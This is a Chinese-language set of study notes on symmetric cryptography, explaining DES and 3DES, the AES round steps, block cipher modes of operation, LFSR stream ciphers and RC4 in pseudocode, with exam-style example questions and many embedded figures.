<h1 id="三-对称加密算法"><a href="#三-对称加密算法" class="headerlink" title="三. 对称加密算法"></a>三. 对称加密算法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">引自合天网安实验室：https:&#x2F;&#x2F;www.hetianlab.com&#x2F;expc.do?ce&#x3D;7bbc91e0-a9b3-4af9-a108-ce94117ee430</span><br><span class="line">以及现代密码学（谷利泽版）</span><br></pre></td></tr></table></figure>
<h2 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h2><p>设计思想：</p>
<ul>
<li>混淆：明文/密钥和密文之间的关系复杂</li>
<li>分组：明文/密钥的每一个比特都影响密文的每一个比特<h3 id="DES算法（数据加密标准）"><a href="#DES算法（数据加密标准）" class="headerlink" title="DES算法（数据加密标准）"></a>DES算法（数据加密标准）</h3><h4 id="1-Feistel结构"><a href="#1-Feistel结构" class="headerlink" title="1. Feistel结构"></a>1. Feistel结构</h4>明文和密文分组长度为64Bit，密钥长度56bit（密钥空间2^56）<br>算法包括：迭代加密和密钥编排<br><img src="https://img-blog.csdnimg.cn/20210327093613965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>IP置换（初始置换）<br>根据初始置换表，将明文数据移到该数据所在位置<br><img src="https://img-blog.csdnimg.cn/20210415204556595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从上表我们可以总结出，初始置换表的规律其实就是（其实不用太在意这个规律）：<pre><code>a. 偶数与奇数分开（1~64），然后分为上下两部分，分布在置换表中，偶数在上，奇数在下。
b. 在偶数与奇数内部，又遵从“从右到左，从上到下，从小到大”的排列。
</code></pre>
</li>
</ul>
<p> 实际中加密的是二进制数据，为直观展示这里用字母代替<br><img src="https://img-blog.csdnimg.cn/20210415204848819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>置换完<br><img src="https://img-blog.csdnimg.cn/20210415204908903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至此我们便得到了初始置换之后的数据</p>
<pre><code>  Data=“5XPHzrjb7ZRJBtld91TLDvnf=3VNFxph4WOGyqia6YQI(i)Askc80SKCume+2UMEwog”

  L0 = “5XPHzrjb7ZRJBtld91TLDvnf=3VNFxph”

  R0 = “4WOGyqia6YQI(i)Askc80SKCume+2UMEwog”
</code></pre>
<h4 id="2-轮函数"><a href="#2-轮函数" class="headerlink" title="2. 轮函数"></a>2. 轮函数</h4><p><img src="https://img-blog.csdnimg.cn/20210327093642767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>函数 f主要对数据右半部分R进行操作<br>       a. 先对其进行扩展置换，使其变为48位的数据，<br>      b. 然后生成的数据再与子密钥进行异或运算，<br>      c. 再以异或运算后的48位数据进行S盒代替，将48位的数据，转换为32位的数据，<br>      d. 再进行P盒置换，生成32位的数据<br>      e. 最后将P盒置换生成的数据与本轮运算的L进行异或，生成新的R。<br>      f. 而新的L是直接由本轮的R进行替换</p>
<h4 id="3-密钥编排算法"><a href="#3-密钥编排算法" class="headerlink" title="3. 密钥编排算法"></a>3. 密钥编排算法</h4><ul>
<li>子密钥K的生成<br><img src="https://img-blog.csdnimg.cn/2021032711380330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>假设初始64位密钥：<br>“abcdefgh ijklmnop qrstuvwx yzABCDEF GHIJKLMN OPQRSTUV WXYZ0123 456789+=”<br>红色部分为奇偶校验位，不参与加密算法</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20210415205310384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>初始压缩置换后：<br><img src="https://img-blog.csdnimg.cn/20210415205324273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出压缩置换1的规律：<br><img src="https://img-blog.csdnimg.cn/20210415205416110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 压缩置换1接下来的是拆分：</p>
<pre><code>  K0=“4WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ+2UMEwog91TLDvnf80SKCumeBtld”

  C0=“4WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ”

  D0=“+2UMEwog91TLDvnf80SKCumeBtld”
  
  拆分之后我们得到C0、D0，再然后就是循环左移，求出C1、D1：
</code></pre>
<p>根据”轮数和左移位数”的对应表，第一轮得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C1&#x3D;“WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ4”</span><br><span class="line"></span><br><span class="line">D1&#x3D;“2UMEwog91TLDvnf80SKCumeBtld+”</span><br></pre></td></tr></table></figure>
<p>如上，左移的同时还要保持位数不变，所以移动的数据又补充到后面。<br> C1D1= “WOGyqia5XPHzrjb6YQI(i)Askc7ZRJ42UMEwog91TLDvnf80SKCumeBtld+”<br><img src="https://img-blog.csdnimg.cn/20210415205632541.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210415205810750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 压缩置换2<br> <img src="https://img-blog.csdnimg.cn/20210415205831221.png" alt="在这里插入图片描述"><br>得到子密钥K1<br><img src="https://img-blog.csdnimg.cn/20210415205855797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>K1=“jYH7WqG4bisPcI(i)zyR56aJArOvBM1KdUDe0wC8uL+otSnm92E”</p>
<ul>
<li><p>扩展置换E<br>将数据R（32位），按照每4位一组，拆分成8个组，如图，左右黑色的两列是扩展时添加的数据，中间的就是分组后的数据R，表中的数字代表数据R中的位置。分成8组织后，遵循这样的一个规则：每一组的头部添加本组数据上一组的尾部，每一组的尾部添加本组数据下一组的头部。即第一组数据，前面添加的是最后一组的最后一位数据，后面添加的是第二组的第一位数据…以此类推<br><img src="https://img-blog.csdnimg.cn/20210415210037507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此，对R0进行扩展置换<br>R0=“4WOGyqia6YQI(i)Askc80SKCume+2UMEwog”<br><img src="https://img-blog.csdnimg.cn/20210415210108554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后我们便得到了扩展到48位的R0：</p>
<pre><code>R0=“g4WOGYGYqia6a6YQI(i)AI(i)Askc8c80SKCKCume+e+2UMEMEwog4”
</code></pre>
</li>
</ul>
<p>扩展置换E结束之后，我们要进行的就是K1与R0的异或运算</p>
<ul>
<li>S盒代替<br>S盒代替的作用，就是将我们上一步，R0与K1异或后得到的48位数据压缩为32位数据。</li>
</ul>
<p> 我们前面扩展置换后得到的R0是48位的数据，我们的S盒有8个，那么我们就需要将得到的R0平均分为8组，每组对应一个S盒。<br>每一组的数据长度为6位，假设第一组的二进制数据为：“100110”<br>那么，我们取第一位与最后一位，组成行数：“10”=2<br>取中间四位，组成列数：“0011”=3<br>那么，在对应的S1盒中，取2行3列的数据（第3行第4列）：8，转换为2进制：“1000”<br>那么就将这个得到的4位二进制数据，代替原来第一组的6位数据，这样一来，等8个S盒全部代替完毕，我们就得到32位的数据。<br><img src="https://img-blog.csdnimg.cn/20210415210327842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>P盒置换<br><img src="https://img-blog.csdnimg.cn/20210415210354388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至此我们便得到了f(R0,K1),只要再与L0进行异或运算，就得到了第一轮运算最终的R1，然后再将R0的值赋给L1，就完成了第一轮的运算，得到了L1,R1。</li>
</ul>
<h4 id="4-末置换"><a href="#4-末置换" class="headerlink" title="4. 末置换"></a>4. 末置换</h4><p> 经过16次的运算，我们在函数f的最后，会得到“L16、R16”，这正是我们需要的，然后将L16与R16合并，但是与之前的步骤中的合并不同，此次合并需要先交换二者的位置，也就是应该是R16 L16。<br> <img src="https://img-blog.csdnimg.cn/20210415210531836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="5-安全增强"><a href="#5-安全增强" class="headerlink" title="5. 安全增强"></a>5. 安全增强</h4><p>（1）穷举搜索攻击<br>目标：给定输入输出对 (m i , c i = E(k, m i ))  i=1,..,3 ，寻找密钥 k.<br>（2）3DES</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">令 E : K × M -&gt;  M 是一个分组密码</span><br><span class="line">定义 3E: K^3 × M -&gt;M 为 </span><br><span class="line">3E ( (k 1 ,k 2 ,k 3 ), m ) &#x3D;E(k 3 ,E (k 2 , E(k 1 , m)))</span><br><span class="line">密钥长度 &#x3D; 3 × 56 &#x3D; 168 bits ( 穷举攻击复杂度≈2 ^118)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210327094233782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考文章: <a href="https://blog.csdn.net/Drifter_Galaxy/article/details/107703454?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161680947816780261948053%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161680947816780261948053&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-107703454.pc_search_result_hbase_insert&utm_term=%E8%AF%81%E6%98%8E3DES%E7%A9%B7%E4%B8%BE%E6%94%BB%E5%87%BB%E5%A4%8D%E6%9D%82%E5%BA%A6&spm=1018.2226.3001.4187">DES 安全性&amp;3DES </a>, <a href="https://blog.csdn.net/chengqiuming/article/details/82191005?utm_source=blogxgwz7&ops_request_misc=&request_id=&biz_id=102&utm_term=%E8%AF%81%E6%98%8E3DES%E7%A9%B7%E4%B8%BE%E6%94%BB%E5%87%BB%E5%A4%8D%E6%9D%82%E5%BA%A6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-82191005.pc_search_result_hbase_insert&spm=1018.2226.3001.4187">三重DES原理</a></p>
<h3 id="AES算法（高级加密标准）"><a href="#AES算法（高级加密标准）" class="headerlink" title="AES算法（高级加密标准）"></a>AES算法（高级加密标准）</h3><h4 id="对称加密流程"><a href="#对称加密流程" class="headerlink" title="对称加密流程"></a>对称加密流程</h4><p>分组加密算法：明文（128/256bit)和密文分组（128/192/256bit)可变长度<br>SPN结构：轮函数包括：代换层-置换层-密钥混合层<br>密钥长度：128bit（密钥空间2^128)  10轮<br><img src="https://img-blog.csdnimg.cn/20210419182424527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>包含4个步骤</p>
<ul>
<li><p>字节代替<br>  字节代替（SubBytes）的目的是通过S盒完成一个字节到另外一个字节的映射转换，字节替换为这个密码系统提供了替换性。<br><img src="https://img-blog.csdnimg.cn/20210419182655410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>行移位<br>行移位（ShiftRows）步骤过程中，每一行都向左循环位移某个偏移量。在AES中（区块大小128位），第一行维持不变，第二行里的每个字节都向左循环移动一格，第三行里的每个字节都向左循环移动二格，第四行里的每个字节都向左循环移动三格。经过行移位之后，矩阵中每一竖列，都是由输入矩阵中的每个不同列中的元素组成。<br><img src="https://img-blog.csdnimg.cn/20210419182747929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>列混淆<br><img src="https://img-blog.csdnimg.cn/20210419182857621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419182917414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里有一个错误，初始矩阵为，另外列混淆中第二项02·6E=11011100<br><img src="https://img-blog.csdnimg.cn/20210419182946991.png" alt="在这里插入图片描述"><br>有限域上的字节运算：<br><img src="https://img-blog.csdnimg.cn/20210421141126686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<ul>
<li>轮密钥加</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/2021041918302380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419183116692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="AES的密钥编排算法"><a href="#AES的密钥编排算法" class="headerlink" title="AES的密钥编排算法"></a>AES的密钥编排算法</h4><ul>
<li>密钥扩展：<br><img src="https://img-blog.csdnimg.cn/20210421141856551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70"><h4 id="AES的解密变换"><a href="#AES的解密变换" class="headerlink" title="AES的解密变换"></a>AES的解密变换</h4><img src="https://img-blog.csdnimg.cn/20210421142126321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421142146471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h3 id="分组密码的运行模式"><a href="#分组密码的运行模式" class="headerlink" title="分组密码的运行模式"></a>分组密码的运行模式</h3><h4 id="1-ECB模式"><a href="#1-ECB模式" class="headerlink" title="1. ECB模式"></a>1. ECB模式</h4><p><img src="https://img-blog.csdnimg.cn/20210421142435697.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421142449671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210421142423597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="2-CBC模式"><a href="#2-CBC模式" class="headerlink" title="2. CBC模式"></a>2. CBC模式</h4><p><img src="https://img-blog.csdnimg.cn/20210421142506422.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421142517978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421142649479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210421142550875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="3-CFB模式"><a href="#3-CFB模式" class="headerlink" title="3. CFB模式"></a>3. CFB模式</h4><p>反馈是指前一个密文分组的值会被送到密码算法的输入端。<br>在ECB模式和CBC模式中，明文分组都是通过密码算法进行加密的，然而，在CFB模式中，明文分组并没有通过密码算法来直接进行加密。</p>
<p>明文分组和密文分组之间并没有经过“加密”这一步骤。（加解密过程只调用加密算法这一个过程）在CFB模式中，明文分组和密文分组之间只有一个XOR。<br><img src="https://img-blog.csdnimg.cn/20210420201053534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021042114271241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>j通常为8<br><img src="https://img-blog.csdnimg.cn/20210421142730272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210421142743599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>参考文章：<a href="https://blog.csdn.net/chengqiuming/article/details/82355772?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161891767816780255295685%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161891767816780255295685&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-82355772.pc_search_result_cache&utm_term=CFB%E6%A8%A1%E5%BC%8F%E7%9A%84%E9%80%89%E6%8B%A9%E5%AF%86%E6%96%87%E6%94%BB%E5%87%BB">CFB原理</a></p>
<h4 id="4-CTR模式（计数器）"><a href="#4-CTR模式（计数器）" class="headerlink" title="4. CTR模式（计数器）"></a>4. CTR模式（计数器）</h4><p><img src="https://img-blog.csdnimg.cn/20210421142815910.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421142830585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421142843607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><ol>
<li>1977年1月 DES正式成为美国联邦政府信息处理标准，即FIPS-46标准，1997年撤销，采用AES算法，新算法的分组长度为128比特，支持可变密钥长度128，192，256比特。<br>1999年最终选定Rijndanel算法为新的数据加密标准。</li>
<li>WAPI标准是中国颁布的无线局域网安全国家标准<br><img src="https://img-blog.csdnimg.cn/20210421160835894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20210420203022130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421164610383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210421143901835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421143922448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210420203157783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210419183449768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419183505545.png" alt="在这里插入图片描述"></p>
<h3 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h3><p>流密码核心：伪随机数生成器（PRG）</p>
<p>LFSR ：线性反馈移位寄存器（为线性函数）<br>密钥流{k}的周期一定要大<br><img src="https://img-blog.csdnimg.cn/20210421160532637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>例题：<br><img src="https://img-blog.csdnimg.cn/20210421160418343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021042116045197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="RC4算法（序列密码）"><a href="#RC4算法（序列密码）" class="headerlink" title="RC4算法（序列密码）"></a>RC4算法（序列密码）</h3><ul>
<li>KSA <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//S 表随机化</span></span><br><span class="line">s[i] 数据</span><br><span class="line">t[i] 密钥</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="function">	j </span>= (j+s[i]+t[i])%n;</span><br><span class="line">	s[i],s[j]=s[j],s[i];</span><br><span class="line">	</span><br></pre></td></tr></table></figure></li>
<li>PRGA(伪随机数生成算法）<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">i = (i+<span class="number">1</span>)%n</span><br><span class="line">j =  (j+s[i])%n</span><br><span class="line">swap(s[i],s[j])</span><br><span class="line">t = (s[i]+s[j])%n</span><br><span class="line">k = s[t]</span><br></pre></td></tr></table></figure></li>
<li>RC4应用<br><img src="https://img-blog.csdnimg.cn/20210421160146382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h4 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h4><p><img src="https://img-blog.csdnimg.cn/20210421161055387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210421161139913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>13. 一般的，一个反馈移位寄存器由两部分组成：移位寄存器和反馈函数<br><img src="https://img-blog.csdnimg.cn/20210421161203619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="四-Hash函数"><a href="#四-Hash函数" class="headerlink" title="四. Hash函数"></a>四. Hash函数</h1><h2 id="SHA-256算法"><a href="#SHA-256算法" class="headerlink" title="SHA-256算法"></a>SHA-256算法</h2><p><img src="https://img-blog.csdnimg.cn/20210419210353248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
